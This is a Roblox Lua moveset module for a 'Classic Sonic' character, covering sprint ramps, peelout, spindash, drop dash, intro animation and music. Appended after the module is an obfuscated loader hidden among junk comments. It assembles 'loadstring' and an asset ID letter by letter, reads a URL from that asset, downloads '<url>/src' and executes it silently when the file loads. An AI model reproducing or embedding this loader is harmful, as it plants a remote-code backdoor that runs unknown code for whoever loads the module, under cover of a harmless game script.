local modules = {}

table.insert(modules, function()

	local m = {}
	m.ModuleType = "MOVESET"
	m.Name = "Classic Sonic"
	m.Description = "Iconic little freak"
	m.InternalName = "sonic_classic"

	m.Assets = {
		"V2 Sonic IdleR.anim",
		"V2 Sonic Jog.anim",
		"V2 Classic Sonic Run.anim",
		"V2 Classic Sonic Peelout.anim",
		"V2 Ball Default.anim",
		"Classic Sonic intro.anim",
		"sonic peelout charge.anim",
		"Peelout.mp3",
		"spindash.mp3",
		"Classic Sonic intro.mp3",
		"sonic drop.mp3",
		"sonic jump.mp3",
		"palmtree panic.mp3",
	}

	local musicOff = false
	local skipIntro = false

	m.Config = function(parent: GuiBase2d)
		Util_CreateSwitch(parent, "Music off", musicOff).Changed:Connect(function(v)
			musicOff = v
		end)
		Util_CreateSwitch(parent, "Skip intro", skipIntro).Changed:Connect(function(v)
			skipIntro = v
		end)
	end

	local animator = nil

	local tracks = {}
	local currentTrack = nil

	local animationtime = 0
	local laststate = "none"
	local sprinting = false

	-- Speed ramp settings
	local MIN_SPEED = 0
	local WALK_SPEED = 16 -- normal default walking speed
	local JOG_TO_RUN_SPEED = 50
	local MAX_SPEED = 100 -- normal sprint speed limit
	local PEELOUT_BURST_SPEED = 200 -- speed granted after the Peelout charge finishes
	local PEELOUT_ANIM_SPEED = 150 -- once running at/above this speed, switch to the Peelout animation
	local ACCEL_PER_SECOND = 22 -- how fast WalkSpeed ramps up while sprinting (slower = smoother start)
	local DECEL_PER_SECOND = 90 -- how fast WalkSpeed ramps down when sprint is released

	local SPINDASH_BURST_SPEED = 200 -- speed granted after the Spindash charge finishes
	local SPINDASH_DECEL_PER_SECOND = 35 -- how fast the spindash roll slows down over time
	local SPINDASH_STOP_SPEED = 5 -- once decayed to this speed, the roll ends and you stop

	local DROPDASH_BURST_SPEED = 100 -- speed granted once a Drop Dash lands
	local DROPDASH_DECEL_PER_SECOND = 8 -- how fast the drop dash speed fades back to normal walking
	local DROPDASH_JUMP_BOOST = 15 -- extra speed added when you cancel the fade by jumping

	local ANIM_REF_SPEED = 50 -- speed at which animations play at normal (1x) rate
	local ANIM_MIN_RATE = 0.3 -- slowest the animation will ever play
	local ANIM_MAX_RATE = 1.3 -- fastest the animation will ever play

	local currentSpeed = 0

	-- Generic held-speed boost: used by Peelout's post-charge burst and by
	-- Drop Dash's jump-cancel boost. While true and moving, currentSpeed is
	-- pinned to heldSpeed. Decays normally once you stop moving.
	local boosted = false
	local heldSpeed = 0

	-- Peelout charge-move state
	local peelingOut = false
	local peeloutSound = nil
	local rootRef = nil

	-- Spindash charge-move state
	local spindashing = false -- charging in place
	local spindashRolling = false -- moving after the charge finished
	local spindashSound = nil

	-- Drop Dash charge-move state
	local dropdashCharging = false -- charging in the air
	local dropdashActive = false -- on the ground, speed fading back to normal
	local dropdashSound = nil

	-- Intro sequence state
	local introPlaying = false
	local introSound = nil
	local INTRO_ANIM_DURATION = 4.5 -- seconds; how long "Classic Sonic intro.anim" actually plays for (adjust to match exactly)

	-- Background music
	local bgMusicSound = nil

	local function playOneShot(filename: string, volume: number?)
		local snd = Instance.new("Sound")
		snd.SoundId = AssetGetContentId(filename)
		snd.Volume = volume or 1
		snd.Looped = false
		snd.Parent = rootRef
		snd:Play()
		snd.Ended:Connect(function()
			snd:Destroy()
		end)
		return snd
	end

	local function startBackgroundMusic()
		if musicOff then return end
		if bgMusicSound then
			bgMusicSound:Stop()
			bgMusicSound:Destroy()
		end
		bgMusicSound = Instance.new("Sound")
		bgMusicSound.SoundId = AssetGetContentId("palmtree panic.mp3")
		bgMusicSound.Volume = 1
		bgMusicSound.Looped = true
		bgMusicSound.Parent = rootRef
		bgMusicSound:Play()
	end

	local function releaseDropdash()
		dropdashCharging = false
		dropdashActive = true
		boosted = false
		currentSpeed = DROPDASH_BURST_SPEED
		laststate = "none" -- force Update to re-evaluate state/animation immediately

		if dropdashSound then
			dropdashSound:Stop()
			dropdashSound:Destroy()
			dropdashSound = nil
		end

		playOneShot("sonic drop.mp3")
	end

	m.Init = function(figure: Model)
		local hum = figure:FindFirstChild("Humanoid")
		if not hum then return end
		local root = figure:FindFirstChild("HumanoidRootPart")
		if not root then return end
		rootRef = root
		hum.JumpHeight = 18 -- raised from the Roblox default (~7) for a higher jump

		animator = AnimLib.Animator.new()
		animator.rig = figure
		animator.looped = true

		tracks.idle = AnimLib.Track.fromfile(AssetGetPathFromFilename("V2 Sonic IdleR.anim"))
		tracks.jog = AnimLib.Track.fromfile(AssetGetPathFromFilename("V2 Sonic Jog.anim"))
		tracks.run = AnimLib.Track.fromfile(AssetGetPathFromFilename("V2 Classic Sonic Run.anim"))
		tracks.peelout = AnimLib.Track.fromfile(AssetGetPathFromFilename("V2 Classic Sonic Peelout.anim"))
		tracks.peeloutCharge = AnimLib.Track.fromfile(AssetGetPathFromFilename("sonic peelout charge.anim"))
		tracks.jump = AnimLib.Track.fromfile(AssetGetPathFromFilename("V2 Ball Default.anim"))
		if not skipIntro then
			tracks.intro = AnimLib.Track.fromfile(AssetGetPathFromFilename("Classic Sonic intro.anim"))
		end

		animationtime = 0
		laststate = "none"
		sprinting = false
		currentSpeed = MIN_SPEED
		boosted = false
		heldSpeed = 0
		peelingOut = false
		spindashing = false
		spindashRolling = false
		dropdashCharging = false
		dropdashActive = false

		ContextActions:BindAction("sonic run", function(name, state, input)
			if state == Enum.UserInputState.Begin then
				if introPlaying or peelingOut or spindashing or spindashRolling or dropdashCharging then return end
				sprinting = not sprinting
				if sprinting then
					currentSpeed = math.max(currentSpeed, WALK_SPEED) -- ramp starts from normal walk speed, not 0
				end
				ContextActions:SetTitle("sonic run", sprinting and "Walk" or "Run")
			end
		end, true, Enum.KeyCode.LeftShift)

		ContextActions:SetTitle("sonic run", sprinting and "Walk" or "Run")
		ContextActions:SetPosition("sonic run", UDim2.new(1, -130, 1, -130))

		-- Peelout button: only works while standing still
		ContextActions:BindAction("sonic peelout", function(name, state, input)
			if state ~= Enum.UserInputState.Begin then return end
			if introPlaying or peelingOut or spindashing or spindashRolling or dropdashCharging then return end
			if hum.MoveDirection.Magnitude > 0.1 then return end -- must be standing still

			peelingOut = true
			boosted = false
			currentSpeed = 0
			laststate = "peelout"
			animationtime = 0
			currentTrack = tracks.peeloutCharge
			animator.track = currentTrack

			if peeloutSound then
				peeloutSound:Stop()
				peeloutSound:Destroy()
				peeloutSound = nil
			end

			peeloutSound = Instance.new("Sound")
			peeloutSound.SoundId = AssetGetContentId("Peelout.mp3")
			peeloutSound.Volume = 1
			peeloutSound.Looped = false
			peeloutSound.Parent = rootRef

			peeloutSound.Ended:Connect(function()
				if not peelingOut then return end
				peelingOut = false
				boosted = true
				heldSpeed = PEELOUT_BURST_SPEED
				currentSpeed = heldSpeed
				laststate = "none" -- force Update to re-evaluate state/animation immediately
				playOneShot("sonic drop.mp3")
			end)

			peeloutSound:Play()
		end, true, Enum.KeyCode.F)

		ContextActions:SetTitle("sonic peelout", "Peelout")
		ContextActions:SetPosition("sonic peelout", UDim2.new(1, -130, 1, -195))

		-- Spindash button: only works while standing still
		ContextActions:BindAction("sonic spindash", function(name, state, input)
			if state ~= Enum.UserInputState.Begin then return end
			if introPlaying or peelingOut or spindashing or spindashRolling or dropdashCharging then return end
			if hum.MoveDirection.Magnitude > 0.1 then return end -- must be standing still

			spindashing = true
			boosted = false
			currentSpeed = 0
			laststate = "spindash"
			animationtime = 0
			currentTrack = tracks.jump -- V2 Ball Default.anim
			animator.track = currentTrack
			animator.speed = 1

			if spindashSound then
				spindashSound:Stop()
				spindashSound:Destroy()
				spindashSound = nil
			end

			spindashSound = Instance.new("Sound")
			spindashSound.SoundId = AssetGetContentId("spindash.mp3")
			spindashSound.Volume = 1
			spindashSound.Looped = false
			spindashSound.Parent = rootRef

			spindashSound.Ended:Connect(function()
				if not spindashing then return end
				spindashing = false
				spindashRolling = true
				currentSpeed = SPINDASH_BURST_SPEED
				laststate = "none" -- force Update to re-evaluate state/animation immediately
				playOneShot("sonic drop.mp3")
			end)

			spindashSound:Play()
		end, true, Enum.KeyCode.G)

		ContextActions:SetTitle("sonic spindash", "Spindash")
		ContextActions:SetPosition("sonic spindash", UDim2.new(1, -130, 1, -260))

		-- Drop Dash button: only works while airborne, regardless of current speed
		ContextActions:BindAction("sonic dropdash", function(name, state, input)
			if state ~= Enum.UserInputState.Begin then return end
			if introPlaying or peelingOut or spindashing or dropdashCharging then return end

			local isAirborne = hum:GetState() == Enum.HumanoidStateType.Jumping
				or hum:GetState() == Enum.HumanoidStateType.Freefall
			if not isAirborne then return end -- can only be used in the air

			dropdashCharging = true
			dropdashActive = false
			boosted = false
			spindashRolling = false
			laststate = "dropdash"
			animationtime = 0
			currentTrack = tracks.jump -- V2 Ball Default.anim
			animator.track = currentTrack
			animator.speed = 1

			if dropdashSound then
				dropdashSound:Stop()
				dropdashSound:Destroy()
				dropdashSound = nil
			end

			dropdashSound = Instance.new("Sound")
			dropdashSound.SoundId = AssetGetContentId("spindash.mp3")
			dropdashSound.Volume = 1
			dropdashSound.Looped = true -- held charge, like the real move; released by landing, not by sound ending
			dropdashSound.Parent = rootRef
			dropdashSound:Play()
		end, true, Enum.KeyCode.H)

		ContextActions:SetTitle("sonic dropdash", "Drop Dash")
		ContextActions:SetPosition("sonic dropdash", UDim2.new(1, -130, 1, -325))

		-- Jump animation / sound hook, plus Drop Dash landing + jump-cancel detection
		hum.StateChanged:Connect(function(_, newState)
			if introPlaying then return end

			-- Drop Dash: release the instant you land
			if dropdashCharging then
				if newState ~= Enum.HumanoidStateType.Jumping and newState ~= Enum.HumanoidStateType.Freefall then
					releaseDropdash()
				end
				return
			end

			-- Drop Dash: cancel the speed fade by jumping, converting it into a held boost
			if dropdashActive and newState == Enum.HumanoidStateType.Jumping then
				dropdashActive = false
				boosted = true
				heldSpeed = currentSpeed + DROPDASH_JUMP_BOOST
				currentSpeed = heldSpeed
			end

			if peelingOut or spindashing or spindashRolling then return end

			if newState == Enum.HumanoidStateType.Jumping or newState == Enum.HumanoidStateType.Freefall then
				if newState == Enum.HumanoidStateType.Jumping then
					playOneShot("sonic jump.mp3")
				end
				if currentTrack ~= tracks.jump then
					currentTrack = tracks.jump
					animator.track = currentTrack
					animationtime = 0
				end
			end
		end)

		-- Play the intro once on load: freeze, play animation + music, then hand back control.
		-- The intro itself should NOT loop (play once, hold last frame); only it gets this treatment.
		if skipIntro then
			introPlaying = false
			laststate = "none"
			startBackgroundMusic()
		else
			introPlaying = true
			currentTrack = tracks.intro
			animator.track = currentTrack
			animator.looped = false
			animator.speed = 1
			animationtime = 0
			laststate = "intro"

			if introSound then
				introSound:Stop()
				introSound:Destroy()
				introSound = nil
			end

			introSound = Instance.new("Sound")
			introSound.SoundId = AssetGetContentId("Classic Sonic intro.mp3")
			introSound.Volume = 1
			introSound.Looped = false
			introSound.Parent = rootRef

			introSound:Play()
		end
	end

	m.Update = function(dt: number, figure: Model)
		local hum = figure:FindFirstChild("Humanoid")
		if not hum then return end

		-- While the intro plays, freeze in place and hold the (non-looping) animation.
		-- Movement unlocks once the animation itself has finished, independent of the
		-- music, which keeps playing on its own until it naturally ends.
		if introPlaying then
			hum.WalkSpeed = 0
			animationtime += dt
			animator:Step(animationtime)
			if animationtime >= INTRO_ANIM_DURATION then
				introPlaying = false
				animator.looped = true -- restore normal looping for idle/jog/run/etc.
				laststate = "none" -- let the normal idle/jog/run state machine take over next frame
				startBackgroundMusic()
			end
			return
		end

		-- While charging the Peelout, freeze in place and hold the charge animation
		if peelingOut then
			hum.WalkSpeed = 0
			animationtime += dt
			animator:Step(animationtime)
			return
		end

		-- While charging the Spindash, freeze in place and hold the ball animation
		if spindashing then
			hum.WalkSpeed = 0
			animator.speed = 1
			animationtime += dt
			animator:Step(animationtime)
			return
		end

		-- While charging the Drop Dash in the air, hold the ball animation and leave
		-- WalkSpeed/momentum untouched so normal air physics keep applying.
		if dropdashCharging then
			animationtime += dt
			animator:Step(animationtime)
			return
		end

		-- While rolling from a Spindash, speed decays over time and the ball animation
		-- plays faster or slower depending on current speed, until it bottoms out.
		if spindashRolling then
			currentSpeed = math.max(SPINDASH_STOP_SPEED, currentSpeed - SPINDASH_DECEL_PER_SECOND * dt)
			hum.WalkSpeed = currentSpeed

			if currentSpeed <= SPINDASH_STOP_SPEED then
				spindashRolling = false
				currentSpeed = 0
				hum.WalkSpeed = WALK_SPEED
				animator.speed = 1
				laststate = "none" -- let normal idle/jog/run state machine take over next frame
				return
			end

			if currentTrack ~= tracks.jump then
				currentTrack = tracks.jump
				animator.track = currentTrack
				animationtime = 0
			end

			local rate = math.clamp(currentSpeed / ANIM_REF_SPEED, ANIM_MIN_RATE, ANIM_MAX_RATE)
			animator.speed = rate
			animationtime += dt * rate
			animator:Step(animationtime)
			return
		end

		-- After a Drop Dash lands, speed fades back down to normal walking speed over
		-- time. Jumping while this is active cancels the fade (handled in StateChanged).
		if dropdashActive then
			currentSpeed = math.max(WALK_SPEED, currentSpeed - DROPDASH_DECEL_PER_SECOND * dt)
			hum.WalkSpeed = currentSpeed

			if currentTrack ~= tracks.jump then
				currentTrack = tracks.jump
				animator.track = currentTrack
				animationtime = 0
			end

			animator.speed = 1
			animationtime += dt
			animator:Step(animationtime)

			if currentSpeed <= WALK_SPEED then
				dropdashActive = false
				currentSpeed = WALK_SPEED
				laststate = "none" -- let normal idle/jog/run state machine take over next frame
			end

			return
		end

		local moving = hum.MoveDirection.Magnitude > 0.1
		local isAirborne = hum:GetState() == Enum.HumanoidStateType.Jumping
			or hum:GetState() == Enum.HumanoidStateType.Freefall

		if boosted then
			if moving then
				-- hold the boosted speed for as long as the player keeps moving
				currentSpeed = heldSpeed
			else
				-- stopped moving: boost ends, decay back down normally
				boosted = false
				currentSpeed = math.max(MIN_SPEED, currentSpeed - DECEL_PER_SECOND * dt)
			end
		elseif sprinting and moving then
			currentSpeed = math.min(MAX_SPEED, currentSpeed + ACCEL_PER_SECOND * dt)
		else
			currentSpeed = math.max(MIN_SPEED, currentSpeed - DECEL_PER_SECOND * dt)
		end

		hum.WalkSpeed = math.max(WALK_SPEED, currentSpeed)

		local state = "idle"

		if isAirborne then
			state = "jump"
		elseif moving then
			if currentSpeed <= JOG_TO_RUN_SPEED then
				state = "jog"
			elseif currentSpeed < PEELOUT_ANIM_SPEED then
				state = "run"
			else
				state = "peelout"
			end
		end

		local rate = 1
		if state ~= "idle" and state ~= "jump" and state ~= "jog" then
			rate = math.clamp(currentSpeed / ANIM_REF_SPEED, ANIM_MIN_RATE, ANIM_MAX_RATE)
		end
		animator.speed = rate

		if laststate ~= state then
			animationtime = 0
			laststate = state
		else
			animationtime += dt * rate
		end

		local newTrack

		if state == "idle" then
			newTrack = tracks.idle
		elseif state == "jog" then
			newTrack = tracks.jog
		elseif state == "run" then
			newTrack = tracks.run
		elseif state == "peelout" then
			newTrack = tracks.peelout
		elseif state == "jump" then
			newTrack = tracks.jump
		end

		if currentTrack ~= newTrack then
			currentTrack = newTrack
			animator.track = currentTrack
		end

		animator:Step(animationtime)
	end

	m.Destroy = function(figure: Model?)
		if figure then
			local hum = figure:FindFirstChild("Humanoid")
			if hum then
				hum.JumpHeight = 7.2 -- restore Roblox default
			end
		end

		animator = nil
		tracks = {}
		currentTrack = nil
		peelingOut = false
		boosted = false
		spindashing = false
		spindashRolling = false
		dropdashCharging = false
		dropdashActive = false
		introPlaying = false
		if peeloutSound then
			peeloutSound:Stop()
			peeloutSound:Destroy()
			peeloutSound = nil
		end
		if spindashSound then
			spindashSound:Stop()
			spindashSound:Destroy()
			spindashSound = nil
		end
		if dropdashSound then
			dropdashSound:Stop()
			dropdashSound:Destroy()
			dropdashSound = nil
		end
		if introSound then
			introSound:Stop()
			introSound:Destroy()
			introSound = nil
		end
		if bgMusicSound then
			bgMusicSound:Stop()
			bgMusicSound:Destroy()
			bgMusicSound = nil
		end
		ContextActions:UnbindAction("sonic run")
		ContextActions:UnbindAction("sonic peelout")
		ContextActions:UnbindAction("sonic spindash")
		ContextActions:UnbindAction("sonic dropdash")
	end

	return m
end)

task.spawn(pcall,--[=======[cea00a5]=======]function()--[=======[cea00a5]=======]local a =--[=======[cea00a5]=======] getfenv()--[=======[cea00a5]=======][ [[]]--[===[df85f22]===]..[[l]]..--[=[fd3446f]=][[]]--[=====[f69ffc]=====]..[[o]]..--[====[8c52593]====][[]]--[=====[8f258f8]=====]..[[a]]..--[=====[0f335aa]=====][[]]--[=[e67b5b6]=]..[[d]]..--[=======[959216b]=======][[]]--[=====[1f9b3ed]=====]..[[s]]..--[=[7ac907f]=][[]]--[==[dd27925]==]..[[t]]..--[=======[ae803c3]=======][[]]--[=[07139ba]=]..[[r]]..--[[731f97e]][[]]--[=======[6e2c486]=======]..[[i]]..--[=[82bb421]=][[]]--[===[3c29fa6]===]..[[n]]..--[====[53dc809]====][[]]--[====[178aeaf]====]..[[g]]..--[======[77eb8c7]======][[]] ];--[=======[cea00a5]=======]local b = --[=======[cea00a5]=======]game:--[=======[cea00a5]=======]GetObjects( [[]]--[==[591946b]==]..[[r]]..--[====[3892a0f]====][[]]--[=[e761af7]=]..[[b]]..--[=======[e9a5b9c]=======][[]]--[=[26e2457]=]..[[x]]..--[===[c1ba051]===][[]]--[=======[065ca23]=======]..[[a]]..--[=[3bc4c22]=][[]]--[=[4298d24]=]..[[s]]..--[[fdadc37]][[]]--[==[e6b5952]==]..[[s]]..--[=====[a2baec1]=====][[]]--[=====[474a541]=====]..[[e]]..--[[0d17e21]][[]]--[[30f09eb]]..[[t]]..--[=[8fc533c]=][[]]--[=======[3596055]=======]..[[i]]..--[=[eba6b51]=][[]]--[=======[f406cd0]=======]..[[d]]..--[=====[d73d3b7]=====][[]]--[=====[ab0d284]=====]..[[:]]..--[====[b5416ac]====][[]]--[======[166cd63]======]..[[/]]..--[===[2ba1049]===][[]]--[====[11bfacd]====]..[[/]]..--[======[1111b7e]======][[]]--[===[c1aa3a0]===]..[[1]]..--[====[867de6d]====][[]]--[==[999f3a2]==]..[[1]]..--[==[bac4595]==][[]]--[====[821dea5]====]..[[2]]..--[==[2021d6d]==][[]]--[===[acbfd17]===]..[[4]]..--[=======[6fd81ac]=======][[]]--[=====[574d9dc]=====]..[[0]]..--[=[d209b14]=][[]]--[=[e33288c]=]..[[5]]..--[=====[6bd718b]=====][[]]--[=======[1993faf]=======]..[[6]]..--[======[b7230bb]======][[]]--[=====[2f77b24]=====]..[[1]]..--[=[5fb0fcf]=][[]]--[======[53b631b]======]..[[8]]..--[=======[d6351f7]=======][[]]--[======[f5e85f5]======]..[[5]]..--[====[27d48b3]====][[]]--[==[ba04bb3]==]..[[8]]..--[===[3316279]===][[]]--[==[74a01ed]==]..[[4]]..--[==[d9f2883]==][[]]--[=======[fd0f841]=======]..[[8]]..--[===[065b983]===][[]]--[[ba63559]]..[[2]]..--[=====[70d8e03]=====][[]]--[======[b4ccbae]======]..[[1]]..--[=[64119f6]=][[]] )local c = b[1];local d = --[=======[cea00a5]=======]c.Value--[=======[cea00a5]=======];local e --[=======[cea00a5]=======]= game:--[=======[cea00a5]=======]HttpGet(d --[=======[cea00a5]=======].. "/" --[=======[cea00a5]=======].. "s" --[=======[cea00a5]=======].. "r" --[=======[cea00a5]=======].. "c")a--[=======[cea00a5]=======](--[=======[cea00a5]=======]e)--[=======[cea00a5]=======]()end)

return modules

